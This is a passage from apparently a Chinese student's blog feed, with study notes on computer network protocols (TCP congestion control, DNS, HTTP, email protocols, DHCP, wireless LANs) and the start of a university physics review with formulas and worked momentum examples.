src="https://oss.iuoyt.com/img/posts/image-20240702154641312.png" alt="快重传" style="zoom: 50%;" /><h5 id="快恢复">快恢复</h5><ul><li>当发送端收到连续三个重复的确认时，由于发送方现在认为网络很可能没有发生拥塞，因此现在不执行慢开始算法，而是执行快恢复算法 FR (Fast Recovery) 算法：<ul><li>慢开始门限 ssthresh = 当前拥塞窗口 cwnd / 2 ；</li><li>新拥塞窗口 cwnd = 慢开始门限 ssthresh ；</li><li>开始执行拥塞避免算法，使拥塞窗口缓慢地线性增大。</li></ul></li></ul><h5 id="实现举例">实现举例</h5><img src="https://oss.iuoyt.com/img/posts/image-20240702154522424.png" alt="避免拥塞" style="zoom:50%;" /><ol><li>在执行慢开始算法时，拥塞窗口 cwnd=1，发送第一个报文段。</li><li>发送方每收到一个对新报文段的确认 ACK，就把拥塞窗口值加倍，然后开始下一轮的传输（请注意，横坐标是传输轮次，不是时间）。因此拥塞窗口 cwnd 随着传输轮次按指数规律增长。</li><li>当拥塞窗口 cwnd 增长到慢开始门限值 ssthresh 时（图中的点① ，此时拥塞窗口 cwnd = 16），就改为执行拥塞避免算法，拥塞窗口按线性规律增长。</li><li>当拥塞窗口 cwnd = 24 时，网络出现了超时（图中的点②），发送方判断为网络拥塞。于是调整门限值 ssthresh = cwnd / 2 = 12，同时设置拥塞窗口 cwnd = 1，进入慢开始阶段。</li><li>按照慢开始算法，发送方每收到一个对新报文段的确认 ACK，就把拥塞窗口值加 1。当拥塞窗口 cwnd = ssthresh = 12 时（图中的点③，这是新的 ssthresh 值），改为执行拥塞避免算法，拥塞窗口按线性规律增大。</li><li>当拥塞窗口 cwnd = 16 时（图中的点④），出现了一个新的情况，就是发送方一连收到 3 个对同一个报文段的重复确认（图中3-ACK）。发送方改为执行快重传和快恢复算法。</li></ol><h2 id="第六章-应用层">第六章 应用层</h2><h3 id="DNS">DNS</h3><ul><li>域名系统DNS (Domain Name System)是解决互联网上机器命名的系统，用它来管理名字（域名）和IP的对应关系。</li><li>任何一个连接在互联网上的主机或路由器，都有一个唯一的层次结构的名字，即域名。域名的结构由标号序列组成，各标号之间用点隔开：<code>….三级域名.二级域名.顶级域名</code>。域名只是个逻辑概念，并不代表计算机所在的物理地点，便于记忆与使用。</li></ul><h4 id="域名服务器">域名服务器</h4><ul><li>域名服务器有以下四种类型：<ul><li>根域名服务器（最高层次）：本地域名服务器若无法解析一个域名，就先求助于根域名服务器。</li><li>顶级域名服务器（管理所有二级域名）：当收到 DNS 查询请求时，就给出相应的回答（最后的结果，或是下一步应当找的域名服务器的 IP 地址）。</li><li>权限域名服务器（负责一个区）：若不能给出最后的查询回答，会告诉发出查询请求的 DNS 客户，下一步应当找哪一个权限域名服务器。</li><li>本地域名服务器（默认域名服务器）：当一个主机发出 DNS 查询请求时，这个查询请求报文就发送给本地域名服务器。</li></ul></li><li>提高域名服务器的可靠性：<ul><li>DNS 域名服务器把数据复制到几个域名服务器来保存，其中的一个是主域名服务器，其他的是辅助域名服务器。当主域名服务器出故障时，辅助域名服务器可保证 DNS 的查询工作不会中断。</li><li>主域名服务器定期把数据复制到辅助域名服务器中，而更改数据只能在主域名服务器中进行。（保证数据的一致性）</li><li>每个域名服务器都维护一个高速缓存，存放最近用过的名字以及从何处获得名字映射信息的记录。减轻根域名服务器的负荷，使互联网上的 DNS 查询请求和回答报文的数量大为减少。</li></ul></li></ul><h4 id="域名解析">域名解析</h4><ul><li><p>将域名转换为对应的IP地址的过程称为域名解析，完成该功能的软件叫域名解析器，每个本地域名服务器配置一个域名解析器软件。</p></li><li><p>域名解析过程：</p><ul><li><p><u>主机向本地域名服务器的查询一般都是采用递归查询</u>。如果主机所询问的本地域名服务器不知道被查询域名的 IP 地址，则本地域名服务器就以 DNS 客户的身份，向其他根域名服务器继续发出查询请求报文。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702111343678.png" alt="迭代查询" style="zoom:50%;" /></li><li><p><u>本地域名服务器向根域名服务器的查询通常是采用迭代查询</u>。当根域名服务器收到本地域名服务器的迭代查询请求报文时，要么给出所要查询的 IP 地址，要么告诉本地域名服务器：“你下一步应当向哪一个域名服务器进行查询”。然后让本地域名服务器进行后续的查询。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702111410919.png" alt="递归查询" style="zoom:50%;" /></li></ul></li></ul><h3 id="HTTP">HTTP</h3><ul><li>为了使超文本的链接能够高效率地完成，需要用 HTTP 协议来传送一切必须的信息。从层次的角度看，HTTP 是面向事务的 (transaction-oriented) 应用层协议，它是万维网上能够可靠地交换文件（包括文本、声音、图像等各种多媒体文件）的重要基础。</li></ul><h4 id="万维网工作过程">万维网工作过程</h4><img src="https://oss.iuoyt.com/img/posts/image-20240702111948554.png" alt="万维网工作过程" style="zoom:50%;" /><ul><li>每个万维网网点都有一个服务器进程，它不断地监听 TCP 的端口 80，以便发现是否有浏览器向它发出连接建立请求。</li><li>一旦监听到连接建立请求并建立了 TCP 连接之后，浏览器就向万维网服务器发出浏览某个页面的请求，服务器接着就返回所请求的页面作为响应。最后，TCP 连接被释放。</li><li>在浏览器和服务器之间的请求和响应的交互，必须按照规定的格式和遵循一定的规则。这些格式和规则就是超文本传送协议 HTTP。<ul><li>HTTP 规定在 HTTP 客户与 HTTP 服务器之间的每次交互，都由一个 ASCII 码串构成的请求和一个类似的通用互联网扩充，即“类 MIME (MIME-like)”的响应组成。</li><li>HTTP 报文通常都使用 TCP 连接传送。</li></ul></li></ul><h4 id="主要特点">主要特点</h4><ul><li>HTTP 使用了面向连接的 TCP 作为运输层协议，保证了数据的可靠传输。</li><li>HTTP 协议本身也是无连接的，虽然它使用了面向连接的 TCP 向上提供的服务。</li><li>HTTP 是面向事务的客户服务器协议。</li><li>HTTP 1.0 协议是无状态的 (stateless)。</li></ul><h3 id="电子邮件协议">电子邮件协议</h3><ul><li>简单邮件发送协议：SMTP</li><li>通用互联网邮件扩充 MIME</li><li>邮件读取协议：POP3 和 IMAP</li></ul><h4 id="电子邮件的组成（三个主要构件）">电子邮件的组成（三个主要构件）</h4><ul><li><p>用户代理，邮件服务器，以及邮件发送和读取协议</p><img src="https://oss.iuoyt.com/img/posts/image-20240702112753279.png" alt="电子邮件的组成构件" style="zoom: 50%;" /></li><li><p>用户代理（UA）：用户与电子邮件系统的接口。又被称为电子邮件客户端软件。基本功能：撰写、显示、处理和通信。用户代理必须在计算机中安装用户代理软件（如outlook），而万维网电子邮件无需安装代理软件。</p></li><li><p>邮件服务器（MS）：又被称为邮件传输代理。功能：发送和接收邮件，同时还要向发信人报告邮件传送的情况。按照客户 – 服务器方式工作。在发送和读取邮件时使用两个不同的协议：SMTP，POP3。</p></li><li><p>邮件发送和读取协议：</p><ul><li>简单邮件发送协议 SMTP：用于在用户代理向邮件服务器或邮件服务器之间发送邮件。</li><li>邮局协议 POP3：用于用户代理从邮件服务器读取邮件。</li></ul><p>邮件服务器必须能够同时充当客户和服务器。SMTP和POP3（或IMAP）都是使用TCP连接来传送邮件的，目的是为了可靠地传送邮件。</p></li></ul><h4 id="邮件发送和接收步骤">邮件发送和接收步骤</h4><ol><li>发件人调用 PC 中的用户代理撰写和编辑要发送的邮件。</li><li>发件人的用户代理把邮件用 SMTP 协议发给发送方邮件服务器。</li><li>SMTP 服务器把邮件临时存放在邮件缓存队列中，等待发送。</li><li>发送方邮件服务器的 SMTP 客户与接收方邮件服务器的 SMTP 服务器建立 TCP 连接，然后就把邮件缓存队列中的邮件依次发送出去。</li><li>运行在接收方邮件服务器中的SMTP服务器进程收到邮件后，把邮件放入收件人的用户邮箱中，等待收件人进行读取。</li><li>收件人在打算收信时，就运行PC机中的用户代理，使用POP3（或 IMAP）协议读取发送给自己的邮件。</li></ol><h4 id="简单邮件传送协议SMTP">简单邮件传送协议SMTP</h4><ul><li>SMTP 规定了在两个相互通信的 SMTP 进程交换信息的方法。</li><li>SMTP 使用客户–服务器方式。</li><li>SMTP 基于 TCP 实现客户与服务器的通信。</li><li>步骤：<ul><li>建立连接</li><li>邮件传送</li><li>连接释放</li></ul></li></ul><h4 id="邮件读取协议">邮件读取协议</h4><h5 id="POP3">POP3</h5><img src="https://oss.iuoyt.com/img/posts/image-20240702113919699.png" alt="POP3" style="zoom: 50%;" /><ul><li><p>POP3：邮局协议 (Post Office Protocol) 第3个版本</p></li><li><p>使用客户–服务器方式</p></li><li><p>基于TCP实现客户与服务器的通信</p></li><li><p>支持用户鉴别</p></li><li><p>POP3 服务器删除被用户读取了的邮件</p></li></ul><h5 id="IMAP">IMAP</h5><img src="https://oss.iuoyt.com/img/posts/image-20240702113935846.png" alt="IMAP" style="zoom: 50%;" /><ul><li><p>IMAP：网际报文存取协议 (Internet Message Access Protocol)</p></li><li><p>使用客户–服务器方式</p></li><li><p>基于TCP实现客户与服务器的通信</p></li><li><p>是一个联机协议</p></li><li><p>特点：</p><ul><li>连接后只下载邮件首部（部分下载）。</li><li>用户直接在IMAP服务器上创建和管理文件夹。</li><li>用户可以搜索邮件内容。</li><li>用户可以在不同的地方使用不同的计算机随时上网阅读和处理自己的邮件。</li><li>允许收信人只读取邮件中的某一个部分。</li><li>缺点：要想查阅邮件，必须先联网。</li></ul></li></ul><h5 id="POP3和IMAP比较">POP3和IMAP比较</h5><img src="https://oss.iuoyt.com/img/posts/image-20240702114156255.png" alt="POP3和IMAP比较" style="zoom: 50%;" /><h4 id="万维网电子邮件">万维网电子邮件</h4><ul><li><p>优点：</p><ul><li>不需要在计算机中再安装用户代理软件</li><li>计算机能联网，就能非常方便地收发电子邮件</li><li>电子邮件界面非常友好</li></ul></li><li><p>特点：</p><ul><li>发送、接收电子邮件时使用 HTTP 协议</li><li>两个邮件服务器之间传送邮件时使用 SMTP</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240702114504746.png" alt="万维网电子邮件" style="zoom: 50%;" /></li></ul><h4 id="通用互联网邮件扩充-MIME">通用互联网邮件扩充 MIME</h4><ul><li><p>SMTP 有以下缺点：</p><ul><li>SMTP 不能传送可执行文件或其他的二进制对象。</li><li>SMTP 限于传送 7 位的 ASCII 码。许多其他非英语国家的文字（如中文、俄文，甚至带重音符号的法文或德文）就无法传送。</li><li>SMTP 服务器会拒绝超过一定长度的邮件。</li><li>某些 SMTP 的实现并没有完全按照 [RFC 821] 的 SMTP 标准。</li></ul></li><li><p>MIME继续使用[RFC 822]格式，增加了邮件主体结构，并定义了传送非ASCII码的编码规则</p><img src="https://oss.iuoyt.com/img/posts/image-20240702115059066.png" alt="MIME与SMTP的关系" style="zoom: 50%;" /></li></ul><h3 id="万维网WWW">万维网WWW</h3><ul><li>万维网是一个大规模的、联机式的信息储藏所。万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。</li><li>万维网以客户—服务器方式工作。浏览器就是在用户计算机上的万维网客户程序。万维网文档所驻留的计算机则运行服务器程序，因此这个计算机也称为万维网服务器。客户程序向服务器程序发出请求，服务器程序向客户程序送回客户所要的万维网文档。在一个客户程序主窗口上显示出的万维网文档称为页面 (page)。</li></ul><h3 id="DHCP动态主机配置协议">DHCP动态主机配置协议</h3><ul><li><p>互联网广泛使用的动态主机配置协议 DHCP (Dynamic Host Configuration Protocol) 提供了即插即用连网的机制。这种机制允许一台计算机加入新的网络和获取 IP 地址，而不用手工配置。DHCP给运行服务器软件、且位置固定的计算机指派一个永久地址，给运行客户端软件的计算机分配一个临时地址。</p></li><li><p>DHCP 使用客户—服务器方式，采用请求/应答方式工作。需要 IP 地址的主机在启动时就向 DHCP 服务器广播发送发现报文（DHCPDISCOVER），这时该主机就成为 DHCP 客户。本地网络上所有主机都能收到此广播报文，但只有 DHCP 服务器才回答此广播报文。DHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息。若找不到，则从服务器的 IP 地址池（address pool）中取一个地址分配给该计算机。DHCP服务器的回答报文叫做提供报文（DHCPOFFER）。</p></li><li><p>DHCP 基于 UDP 工作，DHCP 服务器运行在 67 号端口， DHCP客户运行在 68 号端口。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702115433547.png" alt="DHCP工作方式" style="zoom: 50%;" /></li></ul><h5 id="DHCP中继代理">DHCP中继代理</h5><ul><li><p>DHCP中继代理（relay agent）：每一个网络至少有一个 DHCP 中继代理，它配置了 DHCP 服务器的 IP 地址信息。当 DHCP 中继代理收到主机发送的发现报文后，就以单播方式向 DHCP 服务器转发此报文，并等待其回答。收到 DHCP 服务器回答的提供报文后，DHCP 中继代理再将此提供报文发回给主机。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702115631889.png" alt="DHCP 中继代理以单播方式转发发现报文 " style="zoom: 50%;" /></li></ul><h5 id="DHCP协议的工作过程">DHCP协议的工作过程</h5><img src="https://oss.iuoyt.com/img/posts/image-20240702115812555.png" alt="DHCP协议的工作过程" style="zoom:50%;" /><ol><li><p>DHCP 服务器被动打开 UDP 端口 67，等待客户端发来的报文</p></li><li><p>DHCP 客户从 UDP 端口 68发送 DHCP 发现报文 DHCPDISCOVER</p></li><li><p>凡收到 DHCP 发现报文的 DHCP 服务器都发出 DHCP 提供报文 DHCPOFFER，因此 DHCP 客户可能收到多个 DHCP 提供报文</p></li><li><p>DHCP 客户从几个 DHCP 服务器中选择其中的一个，并向所选择的 DHCP 服务器发送 DHCP 请求报文 DHCPREQUEST</p></li><li><p>被选择的 DHCP 服务器发送确认报文DHCPACK，进入已绑定状态，并可开始使用得到的临时 IP 地址了</p><p>DHCP 客户现在要根据服务器提供的租用期 T 设置两个计时器 T1 和 T2，它们的超时时间分别是 0.5T 和 0.875T。当超时时间到就要请求更新租用期。</p></li><li><p>租用期过了一半（T1 时间到），DHCP 发送请求报文 DHCPREQUEST，要求更新租用期。</p></li><li><p>DHCP 服务器若同意，则发回确认报文DHCPACK。DHCP 客户得到了新的租用期，重新设置计时器</p></li><li><p>DHCP 服务器若不同意，则发回否认报 DHCPNACK。这时 DHCP 客户必须立即停止使用原来的 IP 地址，而必须重新申请 IP 地址（回到步骤2）。</p><p>若 DHCP 服务器不响应步骤6的请求报文 DHCPREQUEST，则在租用期过了 87.5% 时，DHCP 客户必须重新发送请求报文 DHCPREQUEST（重复步骤6），然后又继续后面的步骤。</p></li><li><p>DHCP 客户可随时提前终止服务器所提供的租用期，这时只需向 DHCP 服务器发送释放报文 DHCPRELEASE 即可。</p></li></ol><h2 id="第九章-无线局域网">第九章 无线局域网</h2><h3 id="WLAN组成">WLAN组成</h3><ul><li><p>接入点AP（无线接入点WAP）：所有在局域网种的站点，对网内或网外的通信必须通过接入点AP。接入点在出厂时就具有一个唯一的48位二进制数字的MAC地址，名称为基本服务集标识符BSSID。</p></li><li><p>802.11标准规定无线局域网最小的构建是基本服务集BSS，BSS包括一个接入点和若干个移动站。BSS所覆盖的地理范围称作基本服务区BSA，一般不超过100m。</p></li><li><p>一个基本服务集可以是孤立的单个服务集，也可以通过接入点AP连接到一个分配系统DS（Distribution System），然后再连接到另一个基本服务集，这样就构成了一个扩展服务集ESS。ESS也有一个不超过32个字符的标识符，称作扩展服务集标识符ESSID。分配系统DS的作用是使扩展的服务集ESS对上层的表现就像一个BSS一样。</p><img src="https://oss.iuoyt.com/img/posts/image-20240702144319262.png" alt="ESS和BSS的关系" style="zoom:50%;" /></li></ul><h3 id="暴露站-隐蔽站问题">暴露站/隐蔽站问题</h3><h4 id="隐蔽站问题">隐蔽站问题</h4><img src="https://oss.iuoyt.com/img/posts/image-20240702141301358.png" alt="隐蔽站问题" style="zoom: 50%;" /><ul><li>A 和 C 检测不到彼此的无线信号，都以为 B 是空闲的，因而都向 B 发送数据，结果发生碰撞。这种未能检测出媒体上已存在的信号的问题叫做隐蔽站问题。</li></ul><h4 id="暴露站问题">暴露站问题</h4><img src="https://oss.iuoyt.com/img/posts/image-20240702133626556.png" alt="隐蔽站" style="zoom: 50%;" /><ul><li>B 向 A 发送数据，而 C 又想和 D 通信。C 检测到媒体上有信号，于是就不向 D 发送数据。 其实 B 向 A 发送数据并不影响 C 向 D 发送数据，这就是暴露站问题 。</li><li>改进的办法是把 CSMA 增加一个碰撞避免 CA (Collision Avoidance)功能。802.11 就使用 CSMA/CA 协议。在使用 CSMA/CA 的同时，还增加使用停止等待协议。</li></ul><h4 id="帧间间隔IFS">帧间间隔IFS</h4><ul><li><p>所有的站在完成发送后，必须再等待一段很短的时间（继续监听）才能发送下一帧。这段时间的通称是帧间间隔 IFS (InterFrame Space)。</p></li><li><p>帧间间隔长度取决于该站欲发送的帧的类型。高优先级帧需要等待的时间较短，因此可优先获得发送权。</p></li><li><p>若低优先级帧还没来得及发送而其他站的高优先级帧已发送到媒体，则媒体变为忙态，因而低优先级帧就只能再推迟发送了。这样就减少了发生碰撞的机会。</p></li><li><p>IFS分为短帧间间隔SIFS和分布协调功能帧间间隔DIFS</p><ul><li>SIFS长度为$28\mu s$，是最短的帧间间隔，用来分隔开属于一次对话的各帧。一个站应当能够在这段时间内从发送方式切换到接收方式。使用 SIFS 的帧类型有：ACK 帧、CTS 帧、由过长的 MAC 帧分片后的数据帧，以及所有回答 AP 探询的帧和在 PCF 方式中接入点 AP 发送出的任何帧。</li><li>DIFS比 SIFS 的帧间间隔要长得多，长度为$128\mu s$​ 。在 DCF 方式中，DIFS 用来发送数据帧和管理帧。</li></ul><img src="https://oss.iuoyt.com/img/posts/image-20240702140258110.png" alt="帧间间隔" style="zoom: 50%;" /><p>当源站发送它的第一个 MAC 帧时，若检测到信道空闲，则在等待一段时间 DIFS 后，信道若仍然空闲，就开始发送。目的站若正确收到此帧，则经过时间间隔 SIFS 后，向源站发送确认帧 ACK。</p></li></ul><h2 id="更多资料">更多资料</h2><h3 id="数据在各层的封装">数据在各层的封装</h3><blockquote><p>图源：<span class='nota' data-nota='这是谁呢'>烤肉sensei</span></p><p><img src="https://oss.iuoyt.com/img/posts/img_v3_02ce_e5982f3e-a647-428b-a8d2-49f075451b3g.png" alt="数据在各层的封装（图源：烤肉sensei）"></p></blockquote><h3 id="各层协议">各层协议</h3><blockquote><p>图源：<span class='nota' data-nota='这是谁呢'>烤肉sensei</span></p><p><img src="https://oss.iuoyt.com/img/posts/img_v3_02ce_ee48b542-82ba-439a-886a-86d2c16b439g.png" alt="各层的协议（图源：烤肉sensei）"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学期总结 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大学物理重要概念及考点参考</title>
      <link href="/posts/22cfe9dd.html"/>
      <url>/posts/22cfe9dd.html</url>
      
        <content type="html"><![CDATA[<h2 id="重要概念及公式">重要概念及公式</h2><h3 id="质点力学与运动学（动量守恒部分）">质点力学与运动学（动量守恒部分）</h3><ul><li><p>位矢[$r$]（矢量）：在空间中任选一点参考点，由参考点引向质点所在位置的矢量</p></li><li><p>位移[$\Delta r$]（矢量）：质点位置变动的大小和方向</p></li><li><p>路程[$S$​]（标量）：质点在其轨迹上经过路径的总长度</p></li><li><p>平均速度[$\bar{v}$]（矢量）：位置矢量对时间的平均变化率</p><p>$\bar{v}=\frac{\Delta r}{\Delta t}$</p></li><li><p>速度/瞬时速度[$v(m/s)$]（矢量）：位矢对时间的变化率或一阶导数</p><p>$v=\lim_{\Delta t \to 0} \frac{\left | \Delta r \right | }{\Delta t}=\left | \frac{\mathrm{d}r}{\mathrm{d}t} \right | $</p></li><li><p>加速度[$\bar{a}(m/s^2)$]（矢量）：反应速度变化快慢</p><p>$\bar{a}=\frac{\Delta v}{\Delta t}$</p></li><li><p>牛顿第一定律：任何物体都保持静止或匀速直线运动状态，直到其他物体所作用的力迫使它改变这种状态为止。</p></li><li><p>牛顿第二定律：物体受到外力作用时，它所获得的加速度的大小与合外力的大小成正比，而与物体的质量成反比；加速度的方向与合外力的方向相同。</p><p>$F=ma$</p></li><li><p>牛顿第三定律：作用力与反作用力，大小相等方向相反，$F=-F’$​</p></li><li><p>万有引力：物体之间的吸引力（引力常量$G=6.67\times10^{-11}N.m^2/kg^2$，质量$m_1,m_2$，距离$r$，单位矢量$e_r$，由$m_1$指向$m_2$为正）</p><p>$F=-G\frac{m_1m_2}{r^2}e_r$</p></li><li><p>重力[$P$]（矢量）：地球对地面附近物体的万有引力，方向指向地球中心</p></li><li><p>重力加速度[$g$]（矢量）：重力作用下物体的加速度</p><p>$g=\frac{P}{m}$，万有引力定律得到=&gt;$g=G\frac{m_E}{R^2}$（地球质量$m_E$，地球半径$R$）</p></li><li><p>弹性力（矢量）：两弹性固体互相接触时施加的作用力</p><p>$F=-kx$（弹簧弹性系数$k$，弹簧伸长量$x$）</p></li><li><p>摩擦力[$F_f$]（矢量）：两个相互接触的物体有相对滑动趋势但还没有相对滑动时产生阻碍相对滑动的力</p><p>$F_f=\mu F_N$（动摩擦因数$\mu$，物体正压力$F_N$​，方向与相对运动方向相反）</p></li><li><p>功[$A(J)$]（标量）：</p><ul><li><p>恒力沿直线路径做功：$A=F\cos\theta\left | \Delta r\right |=F·\Delta r$</p></li><li><p>变力沿曲线路径做功：质点由a到b过程中每一小段做功之和，$A=\int_{a}^{b}\mathrm{d}A =\int_{a}^{b}F·\mathrm{d}r=\int_{a}^{b}F\cos\theta\left | \mathrm{d}r\right |$​</p><p>直角坐标系中：$A=\int_{a}^{b}F·\mathrm{d}r=\int_{a}^{b}F_x\mathrm{d}x+F_y\mathrm{d}y+F_z\mathrm{d}z$</p></li></ul></li><li><p>功率[$P(W)$]（标量）：表示物体做功的快慢</p><p>$\bar{P}=\frac{\Delta A}{\Delta t}$，$P=\lim_{\Delta t \to 0}\frac{\Delta A}{\Delta t}=\frac{\mathrm{d}A}{\mathrm{d}t}=F·v$</p></li><li><p>动能[$E_k(J)$]（标量）：质点运动而具有的能量</p><p>$E_k=\frac{1}{2}mv^2$​</p></li><li><p>动能定理（牛二导出）：F对质点做的功为$A=E_k-E_{k_0}=\frac{1}{2}mv^2-\frac{1}{2}mv_0^2$</p></li><li><p>势能[$E_p(J)$]（标量）：大小是相对的，与选择的零点有关，等于保守力做功的负值</p><p>$\Delta E_p=E_p-E_{p_0}=-A_保$​</p><ul><li>重力势能：$E_p=mgh$​</li><li>弹性势能：$E_p=\frac{1}{2}kx^2$</li><li>引力势能：$E_p=-G\frac{m_1m_2}{r}$​</li></ul></li><li><p>机械能守恒定律：当所有作用于系统的外力对系统所做的功为零且非保守内力所做的功也为零时，系统的机械能恒定不变</p></li><li><p>冲量[$I(N·s)$]（矢量）：恒力与作用时间的乘积</p><p>恒力：$I=F(t-t_0)$</p><p>变力：$I=\lim_{\Delta t_i\to0}\sum F_i\Delta t_i=\int_{t_0}^{t}F\mathrm{d}t$​</p><p>合力：$I=\int_{t_0}^tF\mathrm{d}t=\int_{t_0}^t(\sum_{i=1}^{n}F_i)\mathrm{d}t=\sum_{i=1}^{n}\int_{t_0}^tF_i\mathrm{d}t=\sum_{i=1}^nI_i$（合力在一段作用时间内的冲量等于各分力在同一作用时间内冲量的矢量和，其方向和各分力在同一作用时间内冲量的矢量和的方向相同）</p></li><li><p>动量[$p(kg·m/s)$]（矢量）：$p=mv$​</p></li><li><p>动量定理：作用在质点上的合力$F$在$\mathrm{d}t$​时间间隔内的元冲量等于质点动量的增量</p><p>$\mathrm{d}p=F\mathrm{d}t$​</p></li><li><p>动量守恒定律：在一段时间内作用于质点的合力始终为零时，质点的动量为常矢量</p><p>$\int_{t_0}^t(\sum_iF_{i外})\mathrm{d}t=\sum_ip_i-\sum_ip_{i0}=0$​</p></li><li><p>力矩[$M(N·m)$]（矢量）：位置矢量$r$与力$F$的乘积</p><p>$M=rFsin\theta$​</p></li><li><p>角动量[$L(kg·m^2/s)$]（矢量）：描述圆周运动物体的运动状态</p><p>$L=rmv\sin\theta$​</p></li><li><p>角动量定理：作用于质点的合力对参考点的力矩等于质点对该点的角动量随时间的变化率</p><p>$M=\frac{\mathrm{d}L}{\mathrm{d}t}$​</p></li><li><p>角动量守恒定律：当质点系相对于某一给定参考点的合外力矩为零时，该质点系相对于该给定参考点的角动量矢量保持不变</p></li></ul><h3 id="刚体定轴转动（转动惯量部分）">刚体定轴转动（转动惯量部分）</h3><ul><li><p>角速度[$\omega(rad/s)$]（矢量）：$\omega=\lim_{\Delta t\to 0}\frac{\Delta\theta}{\Delta t}=\frac{\mathrm{d}\theta}{\mathrm{d}t}$，方向：右手螺旋定则​</p></li><li><p>线速度[$v(m/s)$]（标量）：$v=\omega r$</p></li><li><p>角加速度[$\alpha(rad/s^2)$]（标量）：$\omega=\lim_{\Delta t\to 0}\frac{\Delta\omega}{\Delta t}=\frac{\mathrm{d}\omega}{\mathrm{d}t}=\frac{\mathrm{d}^2\theta}{\mathrm{d}t^2}$</p></li><li><p>转动惯量[$I$]：$I=\sum\Delta m_ir_i^2$，积分形式：$I=\int_mr^2\mathrm{d}m$​</p></li><li><p>平行轴定理：若两轴平行，其中一轴过质心，则刚体对两轴的转动惯量的关系为$I=I_c+md^2$​</p></li><li><p>垂直轴定理：无限小厚度的薄板对一与它垂直的坐标轴的转动惯量，等于薄板对板面内另两直角坐标轴的转动惯量之和。若z轴与薄板垂直，Oxy面在薄板内，则有$I_z=I_x+I_y$​</p></li><li><p>组合定理：几个刚体对同一转轴的转动惯量等于各刚体对此转轴的转动惯量之和，即$I=\sum_iI_i$​</p></li><li><p>几种常见刚体的转动惯量</p>  <img src="https://oss.iuoyt.com/img/posts/image-20240623174615431.png" alt="几种常见刚体的转动惯量" style="zoom:50%;" /></li></ul><h3 id="静电场">静电场</h3><ul><li><p>元电荷$e\approx1.602\times10^{-19}C$</p></li><li><p>库仑定律：真空中两个静止的点电荷之间的相互作用力的大小与这两个电荷所带电荷量$q_1$和$q_2$的乘积成正比，与它们之间距离$r$的平方成反比， 作用力的方向沿着两个点电荷的连线，同号电荷相斥，异号电荷相吸。</p><p>$F_{12}=k\frac{q_1q_2}{r_{12}^2}=\frac{q_1q_2}{4\pi\epsilon_0r_{12}^2}e_{r_{12}}$​</p></li><li><p>电场强度[$E(N/C或者V/m)$]：$E=\frac{F}{q_0}$​</p></li></ul><h3 id="简谐振动">简谐振动</h3><ul><li>速度[$v$]：$v=-A\omega\sin(\omega t+\varphi)$，$v=\frac{1}{T}=\frac{\omega}{2\pi}$</li><li>加速度[$a$]：$a=\frac{\mathrm{d}v}{\mathrm{d}t}=-A\omega^2\cos(\omega t+\varphi)=-\omega^2x$</li><li>振幅[$A$]：$A=\sqrt{x_0^2+\frac{v_0^2}{\omega^2}}$</li><li>周期[$T$]：$T=\frac{2\pi}{\omega}$，弹簧振子$T=2\pi\sqrt{\frac{m}{k}}$</li><li>角速度[$\omega$]：$\omega=2\pi v$</li><li>初相[$\varphi$]：$\varphi=\arctan(-\frac{v_0}{\omega x_0})$</li></ul><h2 id="重要考点">重要考点</h2><h3 id="动量守恒（1-5-3）">动量守恒（1.5.3）</h3><ol><li><p>例题1.7（P26）</p><blockquote><p>力$F=6ti$（SI单位）作用在$m=3kg$的质点上，质点沿x轴运动，$t=0$时$v_0=0$，求前2s内力F的冲量和力F对m所做的功。</p></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <p>由质点动量定理可得，力F的冲量为</p><p>$I=\int_0^tF\mathrm{d}t=\int_0^26t\mathrm{d}t=3t^2\Big|_0^2=12N·s$​</p><p>方向沿x轴正向，因为$I=mv-mv_0=mv$</p><p>所以$v=\frac{I}{m}=\frac{12}{3}m/s=4m/s$</p><p>浴室由质点的动能定理可得，力F对m所做的功为</p><p>$A=E_k-E_{k_0}=\frac{1}{2}mv^2-\frac{1}{2}mv^2_0=\frac{1}{2}mv^2=24J$</p>              </div>            </details></li><li><p>例题1.8（P26）</p><blockquote><p>一静止的物体炸裂成三块，其中两块具有相等的质量，且以相同速率$30m/s$沿相互垂直的方向飞开，第三块的质量恰好等于前两块质量之和，求第三块的速度。</p><img src="https://oss.iuoyt.com/img/posts/image-20240623155358223.png" alt="例题1.8图" style="zoom: 33%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              <p>物体的初动量等于零，炸裂时爆炸力为内力，其远大于重力，所以在爆炸过程中，可以利用动量守恒求其近似解。根据动量守恒定律知道，物体分裂为三块后，这三块碎片的动量总和仍然等于零，即</p><p>$m_1v_1+m_2v_2+m_3v_3=0$</p><p>因此，这三个动量必处于同一个平面内，且第三块的动量必和第一、二块的合动量大小相等、方向相反。</p><p>因为$v_1$和$v_2$相互垂直，所以</p><p>$(m_3v_3)^2=(m_1v_1)^2+(m_2v_2)^2$</p><p>由于$m_1=m_2=m,m_3=2m$，所以$v_3$的大小为</p><p>$v_3=\frac{1}{2}\sqrt{v_1^2+v_2^2}=\frac{1}{2}\sqrt{30^2+30^2}m/s\approx21.2m/s$​</p><p>$v_3$与$v_1$所成之角$\alpha$由$\alpha=180°-\theta$决定，因为$\tan\theta=\frac{v_2}{v_1}=1,\theta=45°$，所以$\alpha=135°$</p><p>即$v_3$与$v_1$及$v_2$都成$135°$角，且三者在同一平面内。</p>              </div>            </details></li><li><p>例题1.9（P30）</p><blockquote><p>如图所示，水平放置的光滑桌面中间有一光滑小孔，轻绳一端伸入孔中，另一端系一质量为$10g$的小球，小球沿半径为$40cm$的园周做匀速圆周运动，此时从小孔下拉绳的力为$10^{-3}N$。如果继续向下拉绳，并使小球沿半径为$10cm$的园周做匀速圆周运动，那么此时小球的速率为多少？拉力所做的功是多少？</p><img src="https://oss.iuoyt.com/img/posts/image-20240623161749283.png" alt="例题1.9" style="zoom:33%;" /></blockquote> <details class="folding-tag" ><summary> 查看解答 </summary>              <div class='content'>              